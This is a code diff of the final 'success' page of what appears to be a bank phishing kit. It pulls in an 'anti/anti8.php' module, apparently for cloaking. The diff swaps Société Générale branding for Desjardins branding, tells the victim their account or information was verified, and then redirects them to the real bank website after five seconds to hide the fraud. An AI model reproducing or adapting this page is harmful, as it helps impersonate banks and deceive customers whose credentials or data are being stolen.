@@ -13,82 +13,89 @@ include 'anti/anti8.php';
 
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>SG | Mise à jour réussie</title>
-  <link rel="stylesheet" href="style.css" />
-  <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      font-family: sans-serif;
-      background-color: #ffffff;
-      height: 100vh;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="shortcut icon" href="image/logo.png">
+    <link rel="stylesheet" href="style.css">
+    <title>Succès</title>
+    <style>
+        /* Styles personnalisés pour la page de succès */
+        .success-page {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+        }
 
-    .center-wrapper {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
+        .success-box {
+            background: #28a745;
+            color: white;
+            padding: 30px;
+            border-radius: 8px;
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
 
-    .success-icon {
-      width: 80px;
-      height: 80px;
-      margin-bottom: 20px;
-    }
+        .success-box h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
 
-    .success-circle {
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      background-color: #28a745;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
+        .success-box p {
+            font-size: 1.25rem;
+            margin-bottom: 20px;
+        }
 
-    .success-circle::before {
-      content: '✔';
-      font-size: 40px;
-      color: white;
-    }
+        .spinner-border {
+            width: 3rem;
+            height: 3rem;
+            color: white;
+        }
 
-    .success-message {
-      font-size: 1.4rem;
-      font-weight: 600;
-      color: #000000;
-      margin-bottom: 10px;
-    }
+        .redirect-info {
+            font-size: 1rem;
+            color: white;
+            margin-top: 20px;
+        }
 
-    .redirect-message {
-      font-size: 1rem;
-      color: #555555;
-    }
-  </style>
+        .redirect-info strong {
+            color: #ffd700;
+        }
+    </style>
 </head>
+
 <body>
 
-  <div class="center-wrapper">
-    <div class="success-circle"></div>
-    <div class="success-message">
-      Vos informations ont bien été mises à jour
-    </div>
-    <div class="redirect-message">
-      Vous allez être redirigé vers la page d'accueil...
-    </div>
-  </div>
+    <div class="success-page">
+        <div class="success-box">
+            <h1>Succès</h1>
+            <p>Votre compte a été verifié avec succès !</p>
 
-  <script>
-    setTimeout(() => {
-      window.location.href = "https://www.societegenerale.fr"; // À modifier si besoin
-    }, 5000);
-  </script>
+            <!-- Icône de chargement spinner -->
+            <div class="spinner-border" role="status">
+                <span class="visually-hidden">Chargement...</span>
+            </div>
 
+            <p class="mt-4">Vous allez être redirigé dans quelques secondes...</p>
+            <div class="redirect-info">
+                <p><strong>Desjardins, ensemble, on fait la différence !</strong></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Redirection automatique après 5 secondes
+        setTimeout(function() {
+            window.location.href = "https://www.desjardins.com/qc/fr.html"; // Remplacer par le nom de la page suivante
+        }, 5000); // 5 secondes
+    </script>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
+
 </html>
